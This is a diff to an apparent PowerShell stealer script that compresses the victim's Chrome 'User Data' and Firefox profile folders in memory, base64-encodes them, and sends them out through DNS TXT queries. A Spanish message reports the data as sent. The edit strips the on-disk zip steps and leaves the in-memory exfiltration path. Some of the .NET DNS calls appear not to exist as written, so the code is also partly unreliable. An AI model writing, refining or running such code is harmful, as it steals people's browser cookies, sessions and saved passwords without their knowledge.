@@ -20,12 +20,6 @@ Write-Host "        `    G.m-^m`m'" -ForegroundColor Yellow
 Write-Host "______________________________________" -ForegroundColor Yellow
 Write-Host "" -ForegroundColor Yellow
 
-#-------------------------------------------------------------------
-#Check winRAR installed
-#-------------------------------------------------------------------
-
-
-
 function Compress-FolderToMemory($sourceFolder) {
     $memoryStream = New-Object System.IO.MemoryStream
     $gzipStream = New-Object System.IO.Compression.GzipStream($memoryStream, [IO.Compression.CompressionMode]::Compress)
@@ -55,20 +49,9 @@ function Get-Base64SizeInBytes($base64) {
 $chromeProfileDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 $firefoxProfileDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
 $dateString = Get-Date -Format "yyyyMMdd-HHmmss"
-$chromeZipPath = "$env:temp\chrome-backup-$dateString.zip"
-$firefoxZipPath = "$env:temp\firefox-backup-$dateString.zip"
-
-Compress-Archive -Path $chromeProfileDir -DestinationPath $chromeZipPath
-Compress-Archive -Path $firefoxProfileDir -DestinationPath $firefoxZipPath
-
-
-$chromeZipBytes = Get-Content -Path $chromeZipPath -Encoding Byte
-$firefoxZipBytes = Get-Content -Path $firefoxZipPath -Encoding Byte
-
 
 $chromeZipMemory = Compress-FolderToMemory $chromeProfileDir
 $firefoxZipMemory = Compress-FolderToMemory $firefoxProfileDir
-
 
 $chromeBase64 = [System.Convert]::ToBase64String($chromeZipMemory)
 $firefoxBase64 = [System.Convert]::ToBase64String($firefoxZipMemory)
@@ -105,10 +88,8 @@ if (Get-Base64SizeInBytes($chromeBase64) -gt $maxDnsTxtRecordSize -or Get-Base64
         $dnsRecordType = [Net.DnsRecordType]::Txt
         $dnsClass = [Net.DnsClass]::In
 
-        
         $dnsObject = New-Object System.Net.Dns()
 
-        
         try {
             $dnsObject.Send($dnsName, $dnsRecordType, $dnsClass, $dnsTxtRecordBytes)
             Write-Host "Los datos se enviaron correctamente a través de una consulta DNS"
